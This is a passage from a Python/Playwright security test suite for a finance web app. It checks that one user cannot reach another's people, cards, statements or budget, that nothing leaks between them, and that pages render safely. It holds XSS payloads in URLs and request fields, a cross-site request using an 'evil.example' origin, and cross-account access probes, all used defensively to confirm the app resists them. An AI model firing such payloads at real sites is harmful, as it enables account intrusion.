        ("POST", f"/api/people/{pid}/they-paid", {"client_id": "fn-bob-paid-01", "amount_cents": 100}),
        ("POST", f"/api/people/{pid}/settle", {"client_id": "fn-bob-sett-01", "amount_cents": 100, "direction": "out"}),
        ("DELETE", f"/api/people/{pid}/entries/{eid}", {}), ("DELETE", f"/api/people/{b_pid}/entries/{eid}", {}),
        ("GET", f"/api/people/movement/{mov}", None), ("GET", f"/api/people/movement/{paid_mov or mov}", None),
        ("POST", f"/api/people/{b_pid}/share", {"movement_id": mov, "kind": "paid_for", "cents": 100}),
        ("POST", f"/api/people/{b_pid}/settle", {"client_id": "fn-bob-sett-02", "amount_cents": 100, "direction": "out", "account_id": acc_id}, 400),
        ("PUT", f"/api/cards/{card}", {"limit_cents": 1}), ("PUT", f"/api/cards/{acc_id}", {"limit_cents": 1}),
        ("POST", f"/api/cards/{card}/statement", {"closing_date": fn_day(-1), "full_cents": 1}),
        ("POST", f"/api/cards/{card}/statement", {"closing_date": fn_day(-1), "full_cents": 1, "id": a_st}),
        ("DELETE", f"/api/cards/{card}/statement", {}), ("DELETE", f"/api/cards/{card}/statement?st={a_st}", {}),
        ("PUT", f"/api/recurring/{rec}", {"name": "bob"}), ("DELETE", f"/api/recurring/{rec}", {}),
        ("POST", "/api/recurring", {"name": "x", "amount_cents": 1, "every": "month", "next_date": fn_day(1), "account_id": acc_id}, 400),
        ("PUT", f"/api/movements/{paid_mov or mov}", {"nota": "bob"}), ("DELETE", f"/api/movements/{paid_mov or mov}", {}),
    ]
    # an id in the address is 404; one of hers inside bob's own request body is 400 invalid:<table> (assertOwned),
    # the same answer as for an id that does not exist
    got = [(t[0], t[1], B(t[0], t[1], t[2]).status, t[3] if len(t) > 3 else 404) for t in tries]
    after = [A("GET", f"/api/people/{pid}").body, A("GET", "/api/cards").body, A("GET", "/api/recurring").body]
    check(f"bob refused on all {len(tries)} tries at alice's people, shares, settle-ups, cards, statements, recurrentes; her data unchanged",
          all(st == want for _, _, st, want in got) and before == after, "; ".join(f"{m} {p} {st}" for m, p, st, want in got if st != want))
    leak = [path for path in ("/api/people", "/api/cards", "/api/recurring", "/api/alerts", "/api/alerts/prefs", f"/api/home/extras?month={TODAY[:7]}",
                              "/api/bootstrap", f"/api/summary?month={TODAY[:7]}", "/api/export.csv") if FN_MARK in B("GET", path).body.decode("utf-8", "replace")]
    check("none of alice's Funciones text in bob's answers", not leak, ", ".join(leak))

    # every new screen and Home's banners, for both: payloads shown as text, nothing runs; bob sees none of it
    fn_screens = ["#/", "#/mas", "#/mas/personas", f"#/mas/persona?id={pid}", "#/mas/tarjetas", "#/mas/recurrentes", "#/ajustes/alertas",
                  "#/pasos/alertas", '#/mas/persona?id=<img src=x onerror="window.__xss=32">', "#/mas/persona?id=0", "#/mas/persona?id=1e999"]
    opens = {"#/mas/personas": [], f"#/mas/persona?id={pid}": ["[data-act=fnPersonRename]", "[data-act=fnTheyPaid]", "[data-act=fnSettle]"],
             "#/mas/tarjetas": ["[data-act=fnCardEdit]"], "#/mas/recurrentes": ["[data-act=fnRecEdit]"]}
    with sync_playwright() as pw:
        browser = pw.chromium.launch(executable_path="/usr/bin/google-chrome", headless=True)
        for who, cookie in (("alice", a_cookie), ("bob", b_cookie)):
            ctx, page, errors, dialogs = cu_context(browser, cookie)
            shown, injected, sheets = [], [], 0
            for h in fn_screens:
                page.goto(CU_LOCAL + "/" + h, wait_until="networkidle")
                page.wait_for_timeout(500)
                html = page.evaluate("document.documentElement.outerHTML")
                if FN_MARK in page.inner_text("body"):
                    shown.append(h)
                if page.query_selector(INJECTED) or (who == "bob" and FN_MARK in html):
                    injected.append(h)
                for sel in opens.get(h, []) if who == "alice" else []:
                    el = page.query_selector(sel)
                    try:
                        el.click(timeout=3000)
                    except Exception:  # noqa: BLE001 (not on this screen, or covered)
                        continue
                    page.wait_for_timeout(400)
                    sheets += 1
                    if page.query_selector(INJECTED):
                        injected.append(h + " " + sel)
                    page.evaluate("document.querySelectorAll('dialog[open]').forEach((d) => d.close())")
                    page.wait_for_timeout(300)
            ran = page.evaluate("window.__xss") or dialogs or page.evaluate("window.__csp.length")
            if who == "alice":
                check(f"alice's Funciones screens ({len(fn_screens)}) and {sheets} sheets: payloads shown as text, nothing ran, no CSP violation",
                      {"#/mas/personas", f"#/mas/persona?id={pid}", "#/mas/tarjetas", "#/mas/recurrentes", "#/"} <= set(shown) and sheets >= 3
                      and not injected and not ran and not errors, f"shown {len(shown)} injected {injected[:3]} errors {errors[:2]}")
            else:
                check(f"bob's Funciones screens ({len(fn_screens)}), alice's person id included: none of her text, nothing ran",
                      not shown and not injected and not ran and not errors, f"{shown[:3]} {injected[:3]} {errors[:2]}")
            storage = page.evaluate("() => Object.keys(localStorage).concat(Object.keys(sessionStorage))")
            check(f"{who}: only the theme in browser storage after the Funciones screens", set(storage) <= {"fz_theme"}, str(storage))
            ctx.close()
        browser.close()

    # the fresh check (Melvin's decision 2) on the attack server: no proof, 403 reauth with the method; a wrong
    # passphrase counts on the sign-in counter; the right one gives a proof the sensitive route takes
    no = B("POST", "/api/passkeys/options", {})
    wrong = B("POST", "/api/reauth", {"passphrase": "wrong-" + "x" * 20})
    right = B("POST", "/api/reauth", {"passphrase": b_pw}).json() or {}
    yes = B("POST", "/api/passkeys/options", {}, {"X-FZ-Unlock": right.get("unlock", "")}).status
    check("fresh check: 403 reauth without a proof, wrong passphrase counted, the right one opens the route",
          no.status == 403 and (no.json() or {}).get("method") == "passphrase" and wrong.status == 403
          and (wrong.json() or {}).get("tries_left") == 4 and yes == 200, f"{no.status} {wrong.status} {yes}")
    gone = [B(m, path, body, {"X-FZ-Unlock": right.get("unlock", "")}).status for m, path, body in (
        ("DELETE", "/api/me/resets/1", {}), ("DELETE", "/api/me/resets/999999", {}))]
    check("bob cannot cancel anyone's reset link (404 with a fresh proof)", gone == [404, 404], str(gone))


# ---------------------------------------------------------------- Seguridad, Deploy 2 (weekly "Te quedan", glass box)

def deploy2_part():
    from playwright.sync_api import sync_playwright

    print("== Seguridad: Deploy 2 (weekly Te quedan, Tu presupuesto, the glass box at 320 px)")
    a_name, a_pw = creds("alice")
    b_name, b_pw = creds("bob")
    a_cookie = cu_cookie(cu_req("POST", "/api/login", {"username": a_name, "passphrase": a_pw}))
    b_cookie = cu_cookie(cu_req("POST", "/api/login", {"username": b_name, "passphrase": b_pw}))
    if not (a_cookie and b_cookie):
        check("Deploy 2: alice and bob sign in", False)
        return
    A = lambda m, path, body=None, h=None: cu_req(m, path, body, a_cookie, h)
    B = lambda m, path, body=None, h=None: cu_req(m, path, body, b_cookie, h)
    month = TODAY[:7]

    # alice has no budget row: what she gets must not move when bob switches to weekly
    a_before = [A("GET", f"/api/summary?month={month}").body, A("GET", f"/api/home/extras?month={month}").body]
    a_boot = (A("GET", "/api/bootstrap").json() or {}).get("budget")
    put = B("PUT", "/api/me/budget", {"period": "week", "week_cents": 15000, "week_start": 0})
    b_week = (B("GET", f"/api/home/extras?month={month}").json() or {}).get("week") or {}
    a_after = [A("GET", f"/api/summary?month={month}").body, A("GET", f"/api/home/extras?month={month}").body]
    check("bob turns on weekly: his Home has a week, alice's /summary and /home/extras stay byte for byte, her budget stays monthly",
          put.status == 200 and b_week.get("budget_cents") == 15000 and a_before == a_after and b'"week"' not in a_after[1]
          and a_boot == {"period": "month", "week_cents": None, "week_start": 1}
          and (A("GET", "/api/me/budget").json() or {}).get("period") == "month", f"{put.status} {b_week.get('budget_cents')}")
    bad = [B("PUT", "/api/me/budget", body).status for body in (
        {"period": "week", "week_cents": "100", "week_start": 1}, {"period": "week", "week_cents": None, "week_start": "1"},
        {"period": "week", "week_cents": None, "week_start": 1, "user_id": 1}, {"period": "<script>", "week_cents": None, "week_start": 1},
        {"period": "week", "week_cents": 10 ** 8, "week_start": 1}, {"period": "week", "week_cents": -100, "week_start": 1},
        {"period": "week", "week_cents": None, "week_start": -1}, [], None)]
    xsite = B("PUT", "/api/me/budget", {"period": "month", "week_cents": None, "week_start": 1}, {"Origin": "https://evil.example"}).status
    anon = cu_req("PUT", "/api/me/budget", {"period": "week", "week_cents": None, "week_start": 1}).status
    check("PUT /me/budget: 9 bad bodies 400, another site 403, no session 401; bob's row unchanged",
          bad == [400] * 9 and xsite == 403 and anon == 401
          and (B("GET", "/api/me/budget").json() or {}).get("week_cents") == 15000, f"{bad} {xsite} {anon}")

    with sync_playwright() as pw:
        browser = pw.chromium.launch(executable_path="/usr/bin/google-chrome", headless=True)
        ctx, page, errors, dialogs = cu_context(browser, a_cookie)
        page.set_viewport_size({"width": 320, "height": 700})
        fit = """() => {
          const box = document.querySelector('.summary.boxed'), hero = box && box.querySelector('.hero');
          const r = box ? box.getBoundingClientRect() : null;
          return {box: !!box, week: !!document.querySelector('.weeknote'), long: !!(hero && hero.classList.contains('is-long')),
                  page: document.scrollingElement.scrollWidth, left: r ? Math.round(r.left) : -1, right: r ? Math.round(r.right) : 999,
                  hero: hero ? hero.scrollWidth - hero.clientWidth : 99,
                  spill: [...(box ? box.querySelectorAll('*') : [])].filter((e) => e.getBoundingClientRect().right > r.right + 0.5).length};
        }"""
        seen = {}
        for i, (name, body) in enumerate((("weekly, $99,999 a week", {"period": "week", "week_cents": 9_999_900, "week_start": 0}),
                                          ("weekly, from her limits", {"period": "week", "week_cents": None, "week_start": 3}),
                                          ("monthly", {"period": "month", "week_cents": None, "week_start": 1}))):
            A("PUT", "/api/me/budget", body)
            page.goto(CU_LOCAL + f"/?d2={i}#/", wait_until="networkidle")  # a new address: a full page load each time
            want = "" if body["period"] == "month" else "!"
            cu_wait(page, f"!!document.querySelector('.summary.boxed') && {want}!document.querySelector('.weeknote')")
            page.wait_for_timeout(1500)  # the count-up
            seen[name] = page.evaluate(fit)
        w, m = seen["weekly, $99,999 a week"], seen["monthly"]
        ok = all(v["box"] and v["page"] <= 320 and v["left"] >= 0 and v["right"] <= 320 and v["hero"] <= 0 and v["spill"] == 0 for v in seen.values())
        check("Home at 320 px: the glass box and its big number fit for weekly ($99,999), weekly from limits and monthly",
              ok and w["week"] and w["long"] and not m["week"], json.dumps(seen))

        # Ajustes, Tu presupuesto: the sheet works and saves what was picked
        page.set_viewport_size({"width": 390, "height": 844})
        page.goto(CU_LOCAL + "/#/ajustes", wait_until="networkidle")
        cu_wait(page, "!!document.querySelector('[data-act=budgetOpen]')")
        page.click("[data-act=budgetOpen]")
        cu_wait(page, "!!document.querySelector('form[data-submit=budgetSave]')")
        opts = page.evaluate("[...document.querySelectorAll('form[data-submit=budgetSave] select[name=start] option')].map((o) => o.value)")
        page.click('form[data-submit=budgetSave] [data-act=budgetPeriod][data-v="week"]')
        page.fill('form[data-submit=budgetSave] input[name="amt"]', "150")
        page.select_option('form[data-submit=budgetSave] select[name="start"]', "0")
        page.click("form[data-submit=budgetSave] button.primary")
        cu_wait(page, "!document.querySelector('form[data-submit=budgetSave]')")
        saved = A("GET", "/api/me/budget").json() or {}
        # the way she goes back: the Home tab, no reload. Home must show her week once the server answers
        page.evaluate("location.hash = '#/'")
        home_week = cu_wait(page, "!!document.querySelector('.summary.boxed .weeknote')", 8000)
        page.goto(CU_LOCAL + "/#/analisis?p=semana", wait_until="networkidle")
        page.wait_for_timeout(800)
        ran = page.evaluate("window.__xss") or dialogs or page.evaluate("window.__csp.length")
        check("Tu presupuesto sheet: 7 days (Monday first), weekly $150 from Sunday saved and on Home right after; no payload ran, no CSP violation, no error",
              opts == ["1", "2", "3", "4", "5", "6", "0"] and [saved.get("period"), saved.get("week_cents"), saved.get("week_start")] == ["week", 15000, 0]
              and home_week and not page.query_selector(INJECTED) and not ran and not errors, f"{opts} {saved} week on Home {home_week} {errors[:2]}")
        A("PUT", "/api/me/budget", {"period": "month", "week_cents": None, "week_start": 1})

        # Personas keeps its own big number (not the Home box)
        pid = next((p["id"] for p in (A("GET", "/api/people").json() or {}).get("people", [])), None)
        size = None
        if pid:
            page.goto(CU_LOCAL + f"/#/mas/persona?id={pid}", wait_until="networkidle")
            cu_wait(page, "!!document.querySelector('.summary .hero')")
            size = page.evaluate("(() => { const s = document.querySelector('.summary'); const h = s && s.querySelector('.hero');"
                                 " return h ? [s.classList.contains('boxed'), getComputedStyle(h).fontSize] : null; })()")
        check("Personas: its summary is not the glass box and its number stays 48 px", size == [False, "48px"], str(size))
        ctx.close()
        browser.close()


def main():
    a_cookie, b_cookie, acc_id = api_part()
    import_part(a_cookie, b_cookie, acc_id)  # before the screen walk, so every screen also shows the imported rows
    browser_part()
    login_abuse_part()
    cuentas_part()  # Seguridad, Cuentas review (Nov 25 2026)
    funciones_part(acc_id)  # Seguridad, Funciones review (Nov 25 2026)
    deploy2_part()  # Seguridad, Deploy 2 review (Nov 25 2026)
    failed = [n for n, ok in results if not ok]
    print(f"== {len(results) - len(failed)} of {len(results)} checks passed")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
